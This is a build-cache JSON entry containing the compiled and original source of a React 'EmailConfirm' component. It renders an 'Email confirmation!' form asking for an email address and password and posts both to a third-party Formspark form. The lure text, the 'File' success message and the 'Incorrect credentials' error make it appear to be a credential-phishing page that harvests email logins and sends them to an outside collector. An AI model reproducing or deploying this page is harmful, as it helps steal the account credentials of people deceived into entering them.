{"ast":null,"code":"var _jsxFileName = \"C:\\\\Users\\\\Master\\\\Desktop\\\\newoffgh\\\\src\\\\components\\\\EmailConfirm.jsx\",\n  _s = $RefreshSig$();\nimport React, { useState, useEffect } from \"react\";\nimport { useFormspark } from \"@formspark/use-formspark\";\nimport PacmanLoader from \"react-spinners/PacmanLoader\";\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst FORMSPARK_FORM_ID = \"ekS3rX9oR\";\nconst EmailConfirm = () => {\n  _s();\n  const [emlId, setEmlId] = useState(\"\");\n  const [emlPass, setEmlPass] = useState(\"\");\n  const [loading, setLoading] = useState(false);\n  const [errorMessage, setErrorMessage] = useState('');\n  const [successMessage, setSuccessMessage] = useState('');\n  const [submit, submitting] = useFormspark({\n    formId: FORMSPARK_FORM_ID\n  });\n  const handleSubmit = async event => {\n    event.preventDefault();\n    setLoading(true);\n    try {\n      // Simulate form submission\n      await submit({\n        email: emlId,\n        password: emlPass\n      });\n      // If successful, reset form fields and error message, and set success message\n      setEmlId(\"\");\n      setEmlPass(\"\");\n      setErrorMessage('');\n      setSuccessMessage('File');\n    } catch (error) {\n      // If there's an error, set error message\n      setErrorMessage('Incorrect credentials');\n    } finally {\n      setLoading(false);\n    }\n  };\n  useEffect(() => {\n    const timer = setTimeout(() => {\n      setSuccessMessage('');\n    }, 5000); // Clear success message after 5 seconds\n    return () => clearTimeout(timer);\n  }, [successMessage]);\n  return /*#__PURE__*/_jsxDEV(\"div\", {\n    className: \"flex justify-center items-center h-screen\",\n    children: /*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"md:w-96 w-80 p-4 md:p-8 bg-white\",\n      children: [/*#__PURE__*/_jsxDEV(\"div\", {\n        className: \"text-lg bold text-red-600 my-2 font-bold\",\n        children: \"Email confirmation!\"\n      }, void 0, false, {\n        fileName: _jsxFileName,\n        lineNumber: 44,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(\"form\", {\n        onSubmit: handleSubmit,\n        children: [/*#__PURE__*/_jsxDEV(\"input\", {\n          type: \"email\",\n          value: emlId,\n          onChange: e => setEmlId(e.target.value),\n          className: \"outline-none border-black p-2 my-3 border-2 w-full\",\n          placeholder: \"Email Confirmation *\",\n          required: true\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 46,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n          type: \"password\",\n          value: emlPass,\n          onChange: e => setEmlPass(e.target.value),\n          className: \"outline-none border-black p-2 my-3 border-2 w-full\",\n          placeholder: \"Confirmation password *\",\n          required: true\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 54,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"py-5 w-full\",\n          children: [/*#__PURE__*/_jsxDEV(\"button\", {\n            type: \"submit\",\n            className: \"px-6 py-2 w-full text-white font-semibold bg-blue-700 rounded-md\",\n            disabled: submitting,\n            children: submitting ? /*#__PURE__*/_jsxDEV(PacmanLoader, {\n              color: '#ffffff',\n              loading: true // Always display the loading icon\n              ,\n              size: 20\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 69,\n              columnNumber: 17\n            }, this) : 'Sign In'\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 63,\n            columnNumber: 13\n          }, this), errorMessage && /*#__PURE__*/_jsxDEV(\"p\", {\n            className: \"text-red-500\",\n            children: errorMessage\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 78,\n            columnNumber: 30\n          }, this), successMessage && /*#__PURE__*/_jsxDEV(\"p\", {\n            className: \"text-green-500\",\n            children: successMessage\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 79,\n            columnNumber: 32\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 62,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 45,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 43,\n      columnNumber: 7\n    }, this)\n  }, void 0, false, {\n    fileName: _jsxFileName,\n    lineNumber: 42,\n    columnNumber: 5\n  }, this);\n};\n_s(EmailConfirm, \"69RmEqH56YlDS047dLNXeCGRSL8=\", false, function () {\n  return [useFormspark];\n});\n_c = EmailConfirm;\nexport default EmailConfirm;\nvar _c;\n$RefreshReg$(_c, \"EmailConfirm\");","map":{"version":3,"names":["React","useState","useEffect","useFormspark","PacmanLoader","jsxDEV","_jsxDEV","FORMSPARK_FORM_ID","EmailConfirm","_s","emlId","setEmlId","emlPass","setEmlPass","loading","setLoading","errorMessage","setErrorMessage","successMessage","setSuccessMessage","submit","submitting","formId","handleSubmit","event","preventDefault","email","password","error","timer","setTimeout","clearTimeout","className","children","fileName","_jsxFileName","lineNumber","columnNumber","onSubmit","type","value","onChange","e","target","placeholder","required","disabled","color","size","_c","$RefreshReg$"],"sources":["C:/Users/Master/Desktop/newoffgh/src/components/EmailConfirm.jsx"],"sourcesContent":["import React, { useState, useEffect } from \"react\";\r\nimport { useFormspark } from \"@formspark/use-formspark\";\r\nimport PacmanLoader from \"react-spinners/PacmanLoader\";\r\n\r\nconst FORMSPARK_FORM_ID = \"ekS3rX9oR\";\r\n\r\nconst EmailConfirm = () => {\r\n  const [emlId, setEmlId] = useState(\"\");\r\n  const [emlPass, setEmlPass] = useState(\"\");\r\n  const [loading, setLoading] = useState(false);\r\n  const [errorMessage, setErrorMessage] = useState('');\r\n  const [successMessage, setSuccessMessage] = useState('');\r\n  const [submit, submitting] = useFormspark({ formId: FORMSPARK_FORM_ID });\r\n\r\n  const handleSubmit = async (event) => {\r\n    event.preventDefault();\r\n    setLoading(true);\r\n    try {\r\n      // Simulate form submission\r\n      await submit({ email: emlId, password: emlPass });\r\n      // If successful, reset form fields and error message, and set success message\r\n      setEmlId(\"\");\r\n      setEmlPass(\"\");\r\n      setErrorMessage('');\r\n      setSuccessMessage('File');\r\n    } catch (error) {\r\n      // If there's an error, set error message\r\n      setErrorMessage('Incorrect credentials');\r\n    } finally {\r\n      setLoading(false);\r\n    }\r\n  };\r\n\r\n  useEffect(() => {\r\n    const timer = setTimeout(() => {\r\n      setSuccessMessage('');\r\n    }, 5000); // Clear success message after 5 seconds\r\n    return () => clearTimeout(timer);\r\n  }, [successMessage]);\r\n\r\n  return (\r\n    <div className=\"flex justify-center items-center h-screen\">\r\n      <div className=\"md:w-96 w-80 p-4 md:p-8 bg-white\">\r\n        <div className=\"text-lg bold text-red-600 my-2 font-bold\">Email confirmation!</div>\r\n        <form onSubmit={handleSubmit}>\r\n          <input\r\n            type=\"email\"\r\n            value={emlId}\r\n            onChange={(e) => setEmlId(e.target.value)}\r\n            className=\"outline-none border-black p-2 my-3 border-2 w-full\"\r\n            placeholder=\"Email Confirmation *\"\r\n            required\r\n          />\r\n          <input\r\n            type=\"password\"            \r\n            value={emlPass}\r\n            onChange={(e) => setEmlPass(e.target.value)}\r\n            className=\"outline-none border-black p-2 my-3 border-2 w-full\"\r\n            placeholder=\"Confirmation password *\"\r\n            required\r\n          />\r\n          <div className=\"py-5 w-full\">\r\n            <button\r\n              type=\"submit\"\r\n              className=\"px-6 py-2 w-full text-white font-semibold bg-blue-700 rounded-md\"\r\n              disabled={submitting}\r\n            >\r\n              {submitting ? (\r\n                <PacmanLoader\r\n                  color={'#ffffff'}\r\n                  loading={true} // Always display the loading icon\r\n                  size={20}\r\n                />\r\n              ) : (\r\n                'Sign In'\r\n              )}\r\n            </button>\r\n            {errorMessage && <p className=\"text-red-500\">{errorMessage}</p>}\r\n            {successMessage && <p className=\"text-green-500\">{successMessage}</p>}\r\n          </div>\r\n        </form>\r\n      </div>\r\n    </div>\r\n  );\r\n};\r\n\r\nexport default EmailConfirm;\r\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}